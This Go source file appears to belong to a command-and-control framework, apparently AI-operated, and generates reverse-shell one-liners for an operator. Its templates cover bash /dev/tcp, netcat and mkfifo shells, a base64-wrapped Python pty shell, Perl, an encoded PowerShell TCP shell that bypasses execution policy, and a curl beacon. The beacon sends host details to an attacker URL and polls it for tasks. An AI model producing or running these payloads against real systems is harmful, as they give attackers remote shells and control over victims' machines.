package c2

import (
	"encoding/json"
	"fmt"
	"net/url"
	"strings"

	"cyberstrike-ai/internal/database"
)

// OnelinerKind is the language/form of a single-line payload
type OnelinerKind string

const (
	OnelinerBash       OnelinerKind = "bash"        // bash reverse (TCP reverse listener)
	OnelinerNc         OnelinerKind = "nc"          // netcat reverse
	OnelinerNcMkfifo   OnelinerKind = "nc_mkfifo"   // bidirectional via mkfifo (some nc builds do not support -e)
	OnelinerPython     OnelinerKind = "python"      // python socket reverse
	OnelinerPerl       OnelinerKind = "perl"        // perl reverse
	OnelinerPowerShell OnelinerKind = "powershell"  // PowerShell TCP reverse (IEX style)
	OnelinerCurl       OnelinerKind = "curl_beacon" // periodically poll an HTTP beacon with curl (no binary needed)
)

// AllOnelinerKinds are all supported oneliner kinds
func AllOnelinerKinds() []OnelinerKind {
	return []OnelinerKind{
		OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
		OnelinerPython, OnelinerPerl,
		OnelinerPowerShell, OnelinerCurl,
	}
}

// tcpOnelinerKinds are the bare-TCP reverse kinds supported only by the tcp_reverse listener
var tcpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerBash:       true,
	OnelinerNc:         true,
	OnelinerNcMkfifo:   true,
	OnelinerPython:     true,
	OnelinerPerl:       true,
	OnelinerPowerShell: true,
}

// httpOnelinerKinds are the kinds supported by the http_beacon / https_beacon listeners
var httpOnelinerKinds = map[OnelinerKind]bool{
	OnelinerCurl: true,
}

// OnelinerKindsForListener returns the list of compatible oneliner kinds for a listener type
func OnelinerKindsForListener(listenerType string) []OnelinerKind {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return []OnelinerKind{
			OnelinerBash, OnelinerNc, OnelinerNcMkfifo,
			OnelinerPython, OnelinerPerl, OnelinerPowerShell,
		}
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return []OnelinerKind{OnelinerCurl}
	default:
		return nil
	}
}

// IsOnelinerCompatible checks whether an oneliner kind is compatible with a listener type
func IsOnelinerCompatible(listenerType string, kind OnelinerKind) bool {
	switch ListenerType(listenerType) {
	case ListenerTypeTCPReverse:
		return tcpOnelinerKinds[kind]
	case ListenerTypeHTTPBeacon, ListenerTypeHTTPSBeacon, ListenerTypeWebSocket:
		return httpOnelinerKinds[kind]
	default:
		return false
	}
}

// OnelinerInput are the parameters for generating an oneliner
type OnelinerInput struct {
	Kind         OnelinerKind
	Host         string // the attacker machine callback address (IP/domain)
	Port         int    // listening port
	HTTPBaseURL  string // used for an HTTPS Beacon, e.g. https://x.com
	ImplantToken string // HTTP Beacon authentication token
}

// ValidateOnelinerForListener checks whether an oneliner matches the listener configuration (e.g. tcp_reverse requires an encrypted Beacon by default).
func ValidateOnelinerForListener(listener *database.C2Listener, kind OnelinerKind) error {
	if listener == nil {
		return fmt.Errorf("listener is nil")
	}
	if ListenerType(listener.Type) == ListenerTypeTCPReverse && tcpOnelinerKinds[kind] {
		cfg := &ListenerConfig{}
		if strings.TrimSpace(listener.ConfigJSON) != "" {
			_ = json.Unmarshal([]byte(listener.ConfigJSON), cfg)
		}
		if !cfg.AllowLegacyShell {
			return fmt.Errorf("the listener does not have allow_legacy_shell enabled: tcp_reverse by default only accepts a CSB1-encrypted Beacon (AES-GCM + Token); please use build to generate a beacon, or explicitly enable allow_legacy_shell (not recommended on the public internet)")
		}
	}
	return nil
}

// GenerateOneliner generates a single-line payload.
// Design notes:
//   - does not depend on executables preinstalled on the target (except the bash/python/perl etc. essential to that oneliner);
//   - introduces no quote-nesting traps: it uses base64/url encoding to avoid shell-escaping errors;
//   - also returns an execution example, so the AI can show it directly to the operator in the conversation.
func GenerateOneliner(in OnelinerInput) (string, error) {
	host := strings.TrimSpace(in.Host)
	if err := ValidateBeaconDialHost(host); err != nil {
		return "", err
	}
	switch in.Kind {
	case OnelinerBash:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// Wrap in bash -c to ensure correct execution even in non-bash shells such as zsh/sh
		// /dev/tcp is a bash-specific pseudo-device and must be interpreted by a bash process
		return fmt.Sprintf(`bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'`, host, in.Port), nil

	case OnelinerNc:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(`nc -e /bin/sh %s %d`, host, in.Port), nil

	case OnelinerNcMkfifo:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// A bidirectional mkfifo form, which works even with nc/openbsd-nc that lacks -e
		return fmt.Sprintf(
			`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f`,
			host, in.Port,
		), nil

	case OnelinerPython:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// python -c wrapped in single quotes; using triple quotes or escaping inside causes compatibility problems, so decode from base64 and then exec instead
		py := fmt.Sprintf(
			`import socket,os,pty;s=socket.socket();s.connect(("%s",%d));[os.dup2(s.fileno(),x) for x in (0,1,2)];pty.spawn("/bin/sh")`,
			host, in.Port,
		)
		// Wrap in b64 to avoid quoting problems in the target shell
		return fmt.Sprintf(
			`python3 -c "import base64,sys;exec(base64.b64decode('%s').decode())"`,
			b64StdEncode(py),
		), nil

	case OnelinerPerl:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		return fmt.Sprintf(
			`perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
			host, in.Port,
		), nil

	case OnelinerPowerShell:
		if err := SafeBindPort(in.Port); err != nil {
			return "", err
		}
		// PowerShell TCP reverse (does not depend on old .NET versions)
		ps := fmt.Sprintf(
			`$c=New-Object System.Net.Sockets.TcpClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+'PS '+(pwd).Path+'> ';$by=([text.encoding]::ASCII).GetBytes($o2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`,
			host, in.Port,
		)
		return fmt.Sprintf(
			`powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s`,
			utf16LEBase64(ps),
		), nil

	case OnelinerCurl:
		if strings.TrimSpace(in.HTTPBaseURL) == "" {
			return "", fmt.Errorf("http_base_url is required for curl_beacon")
		}
		if strings.TrimSpace(in.ImplantToken) == "" {
			return "", fmt.Errorf("implant_token is required for curl_beacon")
		}
		base := strings.TrimRight(in.HTTPBaseURL, "/")
		return fmt.Sprintf(
			`bash -c 'H="X-Implant-Token: %s";`+
				`URL="%s";`+
				`HN=$(hostname 2>/dev/null||echo unknown);`+
				`UN=$(whoami 2>/dev/null||echo unknown);`+
				`OS=$(uname -s 2>/dev/null||echo unknown);`+
				`AR=$(uname -m 2>/dev/null||echo unknown);`+
				`IP=$(hostname -I 2>/dev/null|awk "{print \$1}"||echo "");`+
				`ST=$(od -An -N32 -tx1 /dev/urandom|tr -d " \n");[ ${#ST} -eq 64 ]||exit 1;SH="X-Session-Token: $ST";SID="";`+
				`while :;do `+
				`BODY="{\"hostname\":\"$HN\",\"username\":\"$UN\",\"os\":\"$OS\",\"arch\":\"$AR\",\"internal_ip\":\"$IP\",\"pid\":$$}";`+
				`R=$(curl -fsSk -H "$H" -H "$SH" -H "Content-Type: application/json" -X POST "$URL/check_in" -d "$BODY" 2>/dev/null);`+
				`if [ -n "$R" ]&&[ -z "$SID" ];then SID=$(echo "$R"|grep -o "\"session_id\":\"[^\"]*\""|head -1|cut -d"\"" -f4);fi;`+
				`if [ -n "$SID" ];then `+
				`T=$(curl -fsSk -H "$H" -H "$SH" -G "$URL/tasks?session_id=$SID" 2>/dev/null);`+
				`fi;`+
				`sleep 5;`+
				`done' &`,
			in.ImplantToken, base,
		), nil
	}
	return "", fmt.Errorf("unsupported oneliner kind: %s", in.Kind)
}

// urlEncodeForShell URL-encodes a string to avoid special characters breaking escaping in a shell
func urlEncodeForShell(s string) string {
	return url.QueryEscape(s)
}
